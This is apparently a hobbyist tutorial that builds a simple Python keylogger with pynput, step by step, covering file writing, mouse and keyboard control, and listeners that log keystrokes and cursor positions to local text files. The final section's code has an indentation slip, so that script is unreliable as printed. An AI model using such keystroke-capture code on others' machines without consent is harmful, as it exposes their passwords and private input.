
---

I made basic key-logger which can log every activity of keyboard and mouse when activated.
In making of this I learned file handling, keyboard control, mouse control, and input logging using the `pynput` library.  

This is one step towards automation of own tools with having understanding of underlying process occurring.

---
### 0. Setup virtual environment

- Create virtual environment to seperate dependencies
```
python3 -m venv venv
```

- Activate virtual environment
```
source venv/bin/activate
```

- Install pynput 
```
pip install pynput
```

### 1. Basic File Handling

Demonstrates how to open, write, and close files in Python.
- Creates a file named `log.txt`
- Writes a simple message into it

Example:
```
f = open("log.txt","w")
f.write("Hello World")
f.close()
```

Output:- 
![[1.1.png]]

---

### 2. File Handling Using Context Manager

Uses Python's `with` statement which automatically handles file closing.

Features:
- Appends new text to `log.txt`
- Safer and cleaner file handling

Example:

```
with open("log.txt","a") as f:
    f.write("\nAppending text")
```

Output:- 
![[2.1.png]]

---

### 3. Mouse Control with `pynput`

Demonstrates how to programmatically control the mouse cursor.

Features:
- Moves mouse to a specific screen coordinate

Example behavior:
- Moves the cursor to (600,300)
```
from pynput.mouse import Controller
def ControlMouse():
	mouse = Controller()
	mouse.position = (600,300)
ControlMouse()
```

Output:- 

![[3.1.mov]]

---

### 4. Keyboard Control with `pynput`

Shows how to simulate keyboard typing.

Features:

- Automatically types text using Python

Example behavior:
- Types: `"Hi"`
```
import time
from pynput.keyboard import Controller

def ControlKeyboard():
	keyboard = Controller()

# Wait 3 seconds before starting

	time.sleep(3)
	keyboard.type("Hi")
ControlKeyboard()
```

Output:- 
![[4.1.mov]]

---

### 5. Basic Keyboard Listener (Key Logger Example)

Captures keyboard inputs and saves them to a file.

Features:

- Listens for key presses    
- Stores captured keys in `keylog.txt`


Output:- 
![[5.1.mov]]

---

### 6. Mouse Movement Listener

Tracks mouse movement across the screen.

Features:
- Prints cursor position
- Logs coordinates into `movement.txt`

```
from pynput.mouse import Listener

def printcordinate(x,y):
	with open("movement.txt",'a') as f:
		f.write(str((x,y))+"\n")

with Listener(on_move=printcordinate) as l:
	l.join()
```

Output:- 
![[6.1.mov]]

---

### 7. Advanced Keyboard Listener

Improved keyboard logging with key formatting.

Enhancements:

- Converts `Key.space` → space
- Ignores shift key
- Writes clean readable text to `keylog.txt`

```
from pynput.keyboard import Listener

def writefile(key):
	letter = str(key).replace("'","")
	if letter == 'Key.space':
		letter = ' '
	if letter == 'Key.shift':
		letter = ''
	if letter == 'Key.enter':
		letter = '\n'
		
	with open("keylog.txt","a") as f:
	f.write(letter)

with Listener(on_press=writefile) as l:
	l.join()
```

Output:- 

![[7.1.mov]]

---
